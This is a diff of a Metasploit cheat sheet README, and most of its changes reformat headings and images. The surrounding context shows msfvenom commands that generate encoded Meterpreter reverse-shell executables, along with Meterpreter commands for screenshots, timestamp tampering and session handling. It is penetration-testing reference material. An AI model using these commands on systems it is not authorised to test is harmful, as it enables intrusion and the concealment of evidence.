@@ -1,11 +1,13 @@
 <h1>$${\color{red}Welcome} \space {\color{Goldenrod}To } \space {\color{blue}METASPLOIT}$$</h1>
 
-# Metasploit Cheat Sheet :shipit:
+<h1>Metasploit Cheat Sheet :shipit:</h1>
 
 
 <p align="center">
-<img src="https://github.com/4bo4yman/Metasploit_CheatSheet/assets/156849852/ccc77643-897e-4261-bb54-68ce3186c85b" height="300px" width="800px">
+<img src="https://github.com/4bo4yman/Metasploit_CheatSheet/assets/156849852/0a2e32cd-0949-4d48-9f1b-95faf99a7b96" height="300px" width="800px">
 </p>
+
+
 
 Metasploit is the ultimate penetration testing tool for offensive security. And it’s so easy to use that even you could claim to be a hacker just by running a few commands. Also, it is incredibly powerful as well. This guide is a general overview of how Metasploit can be used.
 **********
@@ -148,11 +150,14 @@ $ msfvenom -p windows/meterpreter/reverse_tcp -f exe  -e x86/shikata_ga_nai -i 5
 ```
 <br>
 <br>
+
+
+<p align="center">
+<img src="https://github.com/4bo4yman/Metasploit_CheatSheet/assets/156849852/9a291a4f-78df-4137-87c8-ad0b87702853" height="300px" width="300px">
+</p>
+
 <br>
-
-
-
-
+<br>
 <h1>$${\color{yellow}EXAMPLES}$$</h1>
 
 
@@ -284,9 +289,9 @@ $ msfvenom -p windows/meterpreter/ reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe
 ```
 <br>
 
-##### Metasploit Meterpreter
+<h3>Metasploit Meterpreter</h3>
 
-###### Base Commands: 
+Base Commands: 
 
 > ? / help: Display a summary of commands exit / quit: Exit the Meterpreter session
 
@@ -332,7 +337,7 @@ Process Commands:
 
 - When inside a process, can access any files that process has a lock on.
 
-###### Network Commands:
+Network Commands:
 
 > ipconfig: Show network interface information
 
@@ -340,7 +345,7 @@ Process Commands:
 
 > route: Manage/view the system's routing table
 
-###### Misc Commands:
+Misc Commands:
 
 > idletime: Display the duration that the GUI of thetarget machine has been idle.
 
@@ -348,7 +353,7 @@ Process Commands:
 
 > screenshot: Save as an image a screenshot of the target machine.
 
-###### Additional Modules:
+Additional Modules:
 
 > use [module]: Load the specified module
 
@@ -360,9 +365,9 @@ Process Commands:
 
 > timestomp:Alter NTFS file timestamps
 
-##### Managing Sessions
+Managing Sessions:
 
-###### Multiple Exploitation: 
+Multiple Exploitation: 
 
 Run the exploit expecting a single session that is immediately backgrounded:
 
@@ -378,30 +383,31 @@ msf > exploit –j
 ```
 <br>
 
-###### List all current jobs (usually exploit listeners):
+List all current jobs (usually exploit listeners):
 
 ```
 msf > jobs –l
 ```
 <br>
 
-###### Kill a job:
+
+Kill a job:
 
 ```
 msf > jobs –k [JobID]
 ```
 <br>
 
-##### Multiple Sessions:
+Multiple Sessions:
 
-###### List all backgrounded sessions:
+List all backgrounded sessions:
 
 ```
 msf > sessions -l
 ```
 <br>
 
-###### Interact with a backgrounded session:
+Interact with a backgrounded session:
 
 ```
 msf > session -i [SessionID]
@@ -417,7 +423,7 @@ meterpreter > background
 ```
 <br>
 
-###### Routing Through Sessions:
+Routing Through Sessions:
 
 All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session.
 
